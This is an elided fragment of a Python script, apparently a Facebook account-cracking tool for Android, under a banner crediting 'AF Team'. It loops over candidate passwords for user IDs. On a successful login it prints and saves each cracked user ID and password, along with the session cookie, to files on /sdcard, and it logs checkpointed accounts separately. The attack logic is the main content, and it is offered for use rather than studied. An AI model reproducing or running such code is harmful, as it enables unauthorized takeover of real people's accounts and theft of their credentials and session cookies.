...
\33[1;91m╔════════════════════════════════════════╗
\33[1;92m║[•] Author    : AF                      ║
\33[1;92m║[•] Facebook  : AF Team (Owner)         ║
\33[1;92m║[•] Whatsapp  : +***********            ║
\33[1;92m║[•] Github    : GITHUB-AF-2007          ║
\33[1;92m║[•] Status    : TRIAL                   ║
\33[1;92m║[•] Network   : 3G, 4G/5G, ON           ║
\33[1;92m║[•] Version   : 1.0.7                   ║
\33[1;92m║[•] Tools     : AF Team                 ║
\33[1;91m╚════════════════════════════════════════╝"""
loop = 0
oks = []
cps = []
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[AF-OK💚] ' +uid+ ' | ' +ps+    '  \n[‎‎😍]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/AF-OK.txt', 'a').write( uid+' | '+ps+'\y')
                oks.append(uid)
                break
                ...
                open('/sdcard/AF-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}AF{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
